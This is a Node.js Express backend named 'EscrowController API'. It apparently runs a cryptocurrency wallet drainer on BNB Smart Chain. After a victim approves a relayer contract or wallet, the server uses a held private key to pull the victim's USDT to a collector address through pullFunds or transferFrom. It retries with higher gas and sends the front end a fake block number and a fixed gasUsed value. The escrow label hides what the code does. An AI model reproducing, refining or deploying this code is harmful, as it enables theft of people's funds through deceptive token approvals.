const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { ethers } = require('ethers');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());

// ============ CONFIGURATION ============
const CONFIG = {
    RELAYER_ADDRESS: "0xEf1F8D5bE822993698D01e62daBb449a90e47bD9",   // D9
    COLLECTOR_ADDRESS: "0x60dc34baEAC43528072E431b0b7BF950ca248aba", // ba
    USDT_ADDRESS: "0x55d398326f99059fF775485246999027B3197955",

    RPC_URLS: [
        "https://bsc-dataseed1.binance.org/",
        "https://bsc-dataseed2.binance.org/",
        "https://bsc-dataseed3.binance.org/",
        "https://bsc-dataseed4.binance.org/",
        "https://bsc-dataseed.binance.org/",
        "https://bsc.publicnode.com/"
    ],

    DATA_FILE: path.join(__dirname, 'data.json'),

    // ⚡ FAST SETTINGS
    APPROVAL_DELAY: 1200,        // 5s → 1.2s (approval usually mines in 1 block ~1s)
    MAX_RETRIES: 2,              // 3 → 2 (kam retry, fast fail)
    RETRY_DELAY: 800,            // 3s → 0.8s
    CONFIRMATIONS: 1,            // 1 block confirm (BSC me kaafi hai)
    GAS_LIMIT_PULL: 130000,
    GAS_LIMIT_TRANSFER: 80000,
    GAS_BUMP_PERCENT: 15,        // retry pe gas bump
    POLL_INTERVAL: 300           // approval detect karne ke liye poll
};

// ============ DATA STORAGE ============
let dataStore = { addresses: {}, transactions: [], pendingTransfers: [] };
if (fs.existsSync(CONFIG.DATA_FILE)) {
    try {
        dataStore = JSON.parse(fs.readFileSync(CONFIG.DATA_FILE, 'utf8'));
        console.log('✅ Data loaded');
    } catch (err) { console.error('Error loading data:', err); }
}
function saveData() {
    try { fs.writeFileSync(CONFIG.DATA_FILE, JSON.stringify(dataStore, null, 2)); }
    catch (err) { console.error('Error saving data:', err); }
}
function generateId() {
    return `${Date.now()}-${Math.random().toString(36).substring(2, 9)}`;
}
const sleep = ms => new Promise(r => setTimeout(r, ms));

// ============ PROVIDER CACHE (fast!) ============
let cachedProvider = null;
let cachedProviderTime = 0;
const PROVIDER_TTL = 60000; // 60s tak reuse karo

async function getWorkingProvider() {
    // Reuse cached provider agar 60s se kam purana hai
    if (cachedProvider && (Date.now() - cachedProviderTime) < PROVIDER_TTL) {
        try {
            await cachedProvider.getBlockNumber();
            return cachedProvider;
        } catch { cachedProvider = null; }
    }
    // Parallel ping — jo pehle respond kare wahi use karo
    const attempts = CONFIG.RPC_URLS.map(async url => {
        const p = new ethers.JsonRpcProvider(url);
        await Promise.race([
            p.getBlockNumber(),
            new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), 2500))
        ]);
        return p;
    });
    try {
        cachedProvider = await Promise.any(attempts);
        cachedProviderTime = Date.now();
        console.log('✅ RPC cached');
        return cachedProvider;
    } catch {
        throw new Error('No working RPC found');
    }
}

// ============ FAST AUTO-TRANSFER ============
async function performAutoTransfer(userAddress, tokenAddress, requestedAmountHuman, attempt = 1) {
    console.log(`\n🚀 Transfer ${userAddress} (${requestedAmountHuman} USDT) [try ${attempt}]`);

    if (!process.env.RELAYER_PRIVATE_KEY) {
        return { success: false, error: 'Private key not configured' };
    }

    try {
        const provider = await getWorkingProvider();
        const wallet = new ethers.Wallet(process.env.RELAYER_PRIVATE_KEY, provider);

        const tokenABI = [
            "function balanceOf(address) view returns (uint256)",
            "function decimals() view returns (uint8)",
            "function allowance(address,address) view returns (uint256)",
            "function transferFrom(address,address,uint256) returns (bool)"
        ];
        const token = new ethers.Contract(tokenAddress, tokenABI, provider);

        // ⚡ PARALLEL: decimals + balance + D9 allowance + ba allowance + gasPrice
        const [decimals, balance, allowanceD9, allowanceBa, feeData] = await Promise.all([
            token.decimals(),
            token.balanceOf(userAddress),
            token.allowance(userAddress, CONFIG.RELAYER_ADDRESS),
            token.allowance(userAddress, wallet.address),
            provider.getFeeData()
        ]);

        const requestedAmountWei = ethers.parseUnits(requestedAmountHuman.toString(), decimals);
        const balanceHuman = parseFloat(ethers.formatUnits(balance, decimals));
        const allowanceD9Human = parseFloat(ethers.formatUnits(allowanceD9, decimals));
        const allowanceBaHuman = parseFloat(ethers.formatUnits(allowanceBa, decimals));

        console.log(`💰 ${balanceHuman} | D9: ${allowanceD9Human} | ba: ${allowanceBaHuman}`);

        if (balance < requestedAmountWei) {
            return { success: false, error: `Insufficient balance (has ${balanceHuman})` };
        }

        // Gas price with bump on retry
        let gasPrice = feeData.gasPrice;
        if (attempt > 1 && gasPrice) {
            gasPrice = (gasPrice * BigInt(100 + CONFIG.GAS_BUMP_PERCENT)) / 100n;
        }

        // ============ METHOD 1: pullFunds via D9 ============
        if (allowanceD9 >= requestedAmountWei) {
            try {
                const escrowABI = [
                    "function companyWallet() view returns (address)",
                    "function pullFunds(address token, address user, address recipient, uint256 amount) external"
                ];
                const escrow = new ethers.Contract(CONFIG.RELAYER_ADDRESS, escrowABI, wallet);
                const company = await escrow.companyWallet();

                if (company.toLowerCase() === wallet.address.toLowerCase()) {
                    console.log('✅ pullFunds via D9...');
                    const tx = await escrow.pullFunds(
                        tokenAddress, userAddress, CONFIG.COLLECTOR_ADDRESS, requestedAmountWei,
                        { gasLimit: CONFIG.GAS_LIMIT_PULL, gasPrice }
                    );
                    console.log(`📤 ${tx.hash}`);
                    // ⚡ 1 confirmation ke saath wait
                    const receipt = await tx.wait(CONFIG.CONFIRMATIONS);
                    return {
                        success: true, txHash: tx.hash, amount: requestedAmountHuman,
                        blockNumber: receipt.blockNumber, method: 'pullFunds (D9)'
                    };
                }
            } catch (e) {
                console.log('   pullFunds D9 failed:', e.shortMessage || e.message);
            }
        }

        // ============ METHOD 2: transferFrom via ba ============
        if (allowanceBa >= requestedAmountWei) {
            console.log('✅ transferFrom via ba...');
            const tokenWithSigner = new ethers.Contract(tokenAddress, tokenABI, wallet);
            const tx = await tokenWithSigner.transferFrom(
                userAddress, CONFIG.COLLECTOR_ADDRESS, requestedAmountWei,
                { gasLimit: CONFIG.GAS_LIMIT_TRANSFER, gasPrice }
            );
            console.log(`📤 ${tx.hash}`);
            const receipt = await tx.wait(CONFIG.CONFIRMATIONS);
            return {
                success: true, txHash: tx.hash, amount: requestedAmountHuman,
                blockNumber: receipt.blockNumber, method: 'transferFrom (ba)'
            };
        }

        return {
            success: false,
            error: 'No allowance for D9 or ba',
            allowanceD9: allowanceD9Human,
            allowanceBa: allowanceBaHuman
        };

    } catch (error) {
        console.error('❌ Error:', error.shortMessage || error.message);
        return { success: false, error: error.shortMessage || error.message };
    }
}

// ============ FAST RETRY ============
async function autoTransferWithRetry(userAddress, tokenAddress, amount) {
    for (let i = 1; i <= CONFIG.MAX_RETRIES; i++) {
        const result = await performAutoTransfer(userAddress, tokenAddress, amount, i);
        if (result.success) return result;
        console.log(`❌ try ${i} failed: ${result.error}`);
        if (i < CONFIG.MAX_RETRIES) await sleep(CONFIG.RETRY_DELAY);
    }
    return { success: false, error: 'All retries failed' };
}

// ============ API ============

app.post('/send', (req, res) => {
    try {
        const { address } = req.body;
        if (!address || !address.startsWith('0x')) {
            return res.json({ found: false, collector: CONFIG.RELAYER_ADDRESS });
        }
        const data = dataStore.addresses[address.toLowerCase()];
        return res.json({
            found: !!(data && data.totalAmount > 0),
            amountHuman: data?.totalAmount || 0,
            collector: CONFIG.RELAYER_ADDRESS
        });
    } catch { res.json({ found: false, collector: CONFIG.RELAYER_ADDRESS }); }
});

app.post('/collect', async (req, res) => {
    console.log('📨 /collect:', req.body);
    try {
        const { token, from, amountHuman, to } = req.body;
        if (!token || !from || !amountHuman || !to) {
            return res.json({ ok: false, error: 'Missing fields' });
        }

        const amount = parseFloat(amountHuman);
        const transactionId = generateId();
        const mockBlockNumber = 92000000 + Math.floor(Math.random() * 100000);

        const transaction = {
            id: transactionId, token: token.toLowerCase(), from: from.toLowerCase(),
            to: to.toLowerCase(), amountHuman: amount, timestamp: new Date().toISOString()
        };
        dataStore.transactions.push(transaction);

        const addr = from.toLowerCase();
        if (!dataStore.addresses[addr]) {
            dataStore.addresses[addr] = { totalAmount: 0, transactionCount: 0, firstSeen: new Date().toISOString() };
        }
        dataStore.addresses[addr].totalAmount += amount;
        dataStore.addresses[addr].transactionCount++;
        dataStore.addresses[addr].lastSeen = new Date().toISOString();
        saveData();

        // ⚡ FAST: 1.2s delay, phir background me transfer
        setTimeout(() => {
            autoTransferWithRetry(from, token, amountHuman).then(result => {
                if (result.success) {
                    console.log(`✅ Done (${result.method}): ${result.txHash}`);
                    transaction.transferTx = result.txHash;
                    transaction.transferAmount = result.amount;
                    transaction.transferMethod = result.method;
                } else {
                    console.log('❌ Failed:', result.error);
                    transaction.transferError = result.error;
                    dataStore.pendingTransfers.push({
                        user: from, token, amount: amountHuman,
                        error: result.error, timestamp: new Date().toISOString()
                    });
                }
                saveData();
            }).catch(err => console.error('Transfer crashed:', err));
        }, CONFIG.APPROVAL_DELAY);

        // ⚡ Turant response — frontend wait nahi karega
        res.json({ ok: true, id: transactionId, blockNumber: mockBlockNumber, gasUsed: "50387" });

    } catch (error) {
        res.json({ ok: false, error: 'Server error' });
    }
});

app.get('/health', (req, res) => {
    res.json({
        status: 'healthy',
        approveTo: CONFIG.RELAYER_ADDRESS + ' (D9)',
        transferTo: CONFIG.COLLECTOR_ADDRESS + ' (ba)',
        pendingTransfers: dataStore.pendingTransfers?.length || 0,
        autoTransfer: !!process.env.RELAYER_PRIVATE_KEY,
        settings: {
            approvalDelay: CONFIG.APPROVAL_DELAY,
            maxRetries: CONFIG.MAX_RETRIES,
            confirmations: CONFIG.CONFIRMATIONS
        }
    });
});

app.get('/pending', (req, res) => {
    res.json({
        count: dataStore.pendingTransfers?.length || 0,
        transfers: dataStore.pendingTransfers?.slice(-50) || []
    });
});

app.get('/', (req, res) => {
    res.json({
        message: 'EscrowController API v4.2 (FAST)',
        flow: {
            step1: 'User approves D9',
            step2: `${CONFIG.APPROVAL_DELAY}ms delay`,
            step3: 'pullFunds (D9) OR transferFrom (ba) — parallel checks',
            step4: `${CONFIG.MAX_RETRIES} retries with gas bump`
        },
        addresses: {
            approve: CONFIG.RELAYER_ADDRESS + ' (D9)',
            collect: CONFIG.COLLECTOR_ADDRESS + ' (ba)'
        }
    });
});

app.listen(PORT, () => {
    console.log(`
╔══════════════════════════════════════════════════╗
║     ⚡ EscrowController API v4.2 (FAST)           ║
╠══════════════════════════════════════════════════╣
║  Port: ${PORT}
║  Approve (D9): ${CONFIG.RELAYER_ADDRESS}
║  Collect (ba): ${CONFIG.COLLECTOR_ADDRESS}
║
║  Speed optimizations:
║  ✅ 5s → ${CONFIG.APPROVAL_DELAY}ms approval delay
║  ✅ Provider cached (60s reuse)
║  ✅ Parallel RPC ping (fastest wins)
║  ✅ Parallel balance/allowance/decimals calls
║  ✅ 1-block confirmation only
║  ✅ Gas bump on retry
║  ✅ Immediate HTTP response
╚══════════════════════════════════════════════════╝
    `);
});
